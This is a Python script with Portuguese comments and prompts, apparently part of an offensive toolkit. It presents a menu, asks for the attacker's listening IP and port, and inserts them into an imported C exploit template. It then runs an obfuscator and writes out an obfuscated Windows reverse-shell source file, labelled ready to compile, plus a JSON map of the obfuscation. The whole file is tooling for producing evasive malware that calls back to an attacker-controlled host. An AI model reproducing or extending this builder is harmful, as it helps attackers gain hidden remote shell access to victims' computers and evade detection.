# menu_principal.py

import re
import json
from pathlib import Path
import os
import sys

# Importa o código C base (exploit1.c)
from c_exploit_template import C_CODE_TEMPLATE 

# Importa a função de ofuscação diretamente (evita subprocess)
from ofuscador import ofuscar_codigo_c_hibrido

# Diretório do script atual (absoluto)
SCRIPT_DIR = Path(__file__).parent.resolve()

# Nomes de Arquivos Temporários/Finais (usando caminhos absolutos)
TEMP_INPUT_FILE = SCRIPT_DIR / 'codigo_para_ofuscar.c'
OUTPUT_FILE = SCRIPT_DIR.parent / 'shell_reverso_ofuscado.c'   # c:\Users\pc\Documents\codigos
MAPS_FILE = SCRIPT_DIR.parent / 'shell_reverso_maps.json'

def processar_ofuscacao(ip_addr: str, porta: int):
    
    # 1. Configurar o Código C (substituir placeholders)
    codigo_c_modificado = C_CODE_TEMPLATE.replace(
        '"(seu_ip)"', f'"{ip_addr}"'
    ).replace(
        '"(sua_porta)"', f'"{porta}"'
    )

    print(f"\n-> 📝 Configurando o código C base com IP {ip_addr}:{porta}...")
    
    try:
        # 2. Salvar o arquivo C configurado em um arquivo temporário (opcional)
        TEMP_INPUT_FILE.write_text(codigo_c_modificado, encoding='utf-8')
        print(f"-> Arquivo temporário criado: {TEMP_INPUT_FILE}")

        # 3. Chamar a função de ofuscação diretamente (sem subprocess)
        print("-> ⚙️ Executando ofuscação em processo (import)...")
        codigo_ofuscado, mapa_b64, mapa_renomeacao = ofuscar_codigo_c_hibrido(codigo_c_modificado)

        # 4. Gravar o código ofuscado e os mapas em arquivos (caminhos absolutos)
        OUTPUT_FILE.write_text(codigo_ofuscado, encoding='utf-8')
        with MAPS_FILE.open('w', encoding='utf-8') as f:
            json.dump({'b64': mapa_b64, 'renomeacao': mapa_renomeacao}, f, indent=2, ensure_ascii=False)

        print("\n" + "="*50)
        print("## ✅ SUCESSO! Shell Reverso Ofuscado Gerado ##")
        print(f"Arquivo C OFUSCADO (Pronto para compilar): {OUTPUT_FILE.resolve()}")
        print(f"Arquivo de MAPS (JSON): {MAPS_FILE.resolve()}")
        print("="*50)

    except FileNotFoundError as fnf:
        print(f"\n🚨 ERRO: Arquivo não encontrado: {fnf}")
    except Exception as e:
        print(f"\n🚨 Ocorreu um erro durante o processo: {e}")
        
    finally:
        # 5. Limpar o arquivo temporário
        try:
            if TEMP_INPUT_FILE.exists():
                TEMP_INPUT_FILE.unlink()
                print(f"-> Limpando arquivo temporário: {TEMP_INPUT_FILE}")
        except Exception:
            pass

# --- FUNÇÃO PRINCIPAL DO MENU ---
def menu_principal():
    
    print("\n" + "="*50)
    print("      🔌 OFUSCADOR DE PAYLOAD (Multi-Linguagem Ready) 💾")
    print("="*50)

    # 1. Escolha da Linguagem (Fácil de expandir)
    while True:
        print("\nEscolha o Payload para Configurar:")
        print("  [1] C (Shell Reverso para Windows)")
        print("  [0] Sair")
        
        escolha = input("Opção: ").strip()
        
        if escolha == '1':
            linguagem_selecionada = 'C'
            break
        elif escolha == '0':
            print("\n👋 Saindo do programa. Tchau!")
            return
        else:
            print("❌ Opção inválida.")
            
    # 2. Coleta de Configurações de Rede
    print(f"\n--- Configurações de Rede para {linguagem_selecionada} ---")
    
    while True:
        ip_addr = input("Digite o ENDEREÇO IP (Seu IP de escuta): ").strip()
        if re.match(r'^\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3}$', ip_addr):
            break
        print("❌ IP inválido. Tente novamente.")

    while True:
        try:
            porta = int(input("Digite a PORTA (Porta de escuta): "))
            if 1 <= porta <= 65535:
                break
            else:
                print("❌ Porta fora do intervalo válido (1-65535).")
        except ValueError:
            print("❌ Entrada inválida. Digite um número inteiro.")

    # 3. Processamento
    if linguagem_selecionada == 'C':
        processar_ofuscacao(ip_addr, porta)

# --- Ponto de Entrada do Programa ---
if __name__ == "__main__":
    menu_principal()